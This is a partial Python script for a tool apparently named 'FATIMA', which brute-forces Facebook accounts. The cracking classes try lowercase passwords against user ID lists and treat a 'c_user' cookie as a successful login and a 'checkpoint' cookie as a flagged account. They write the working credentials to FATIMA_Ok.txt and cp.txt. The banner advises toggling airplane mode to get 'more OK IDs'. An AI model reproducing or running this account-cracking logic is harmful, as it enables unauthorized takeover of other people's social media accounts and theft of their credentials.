...
def main():
	...
	print('\033[1;32m        ┌─────────────────────────────────┐') 
	print("\033[1;92m\t│\033[1;92mWELLCOME TO My Word 2.8     \033[1;92m      │")
	print('\033[1;32m┌────────────────────────────────────────────┐') 
	...
	if Adi in ('3', '03'):
		os.system("xdg-openhttps://www.facebook.com/profile.php?id=100059066831353 /?ref=share_group_link")
	if Adi in ('0', '00'):
		exit('THANKS FOR USING HEDI TOOL')  
	else:
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36m FATIMA\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mFATIMA-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mFATIMA\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('FATIMA_Ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;31mFATIMA-CP\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('cp.txt','a').write('%s\n' % wrt)
				break
...
\033[1;37m [∆]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡[∆]
    [➢]\033[1;32;40mAUTHOR\x1b[0m : FATIMA
    [➢]\033[1;34;40mFACE\x1b[0m \033[1;37;40mBOOK\x1b[0m : FATIMA
    [➢]\033[1;32;40mCONTACT\x1b[0m  : No Nmbr
    [➢]\033[1;36;40mVERSION\x1b[0m  : 1.0
    \033[1;31;40mSTATUS\x1b[0m:\033[1;32;40m ✓PREMIUM✓\x1b[0m
 [∆]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡[∆]
   \033[42m\033[1;37m[AIRPLANE MOOD FOR  \033[42m\033[1;37mMORE OK IDS]\x1b[0m
 [∆]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡[∆]"""
ct = datetime.now()
n = ct.month
